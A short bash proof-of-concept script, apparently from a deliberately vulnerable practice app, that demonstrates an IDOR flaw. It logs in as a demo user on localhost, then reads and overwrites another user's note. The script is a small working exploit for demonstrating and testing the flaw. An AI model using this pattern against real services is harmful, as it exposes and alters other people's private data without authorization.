#!/usr/bin/env bash
# Vuln #5: IDOR
set -euo pipefail
BASE="${1:-http://localhost:${PORT:-3000}}"
JAR=$(mktemp); trap 'rm -f "$JAR"' EXIT
CURL="curl -sk -b $JAR -c $JAR"
CSRF=$($CURL -X POST "$BASE/api/login" -H 'Content-Type: application/json' \
  --data-raw '{"username":"alice","password":"alicepass"}' \
  | sed 's/.*"csrf":"\([^"]*\)".*/\1/')

echo "== 1. Alice reads note 3 (owned by Bob):"
$CURL "$BASE/api/notes/3"; echo
echo "== 2. Alice overwrites note 3:"
$CURL -X PUT "$BASE/api/notes/3" -H 'Content-Type: application/json' \
  -H "X-CSRF-Token: $CSRF" --data-raw '{"title":"Bob private","body":"hacked by alice"}'; echo
echo "== 3. Alice reads note 3 again:"
$CURL "$BASE/api/notes/3"; echo
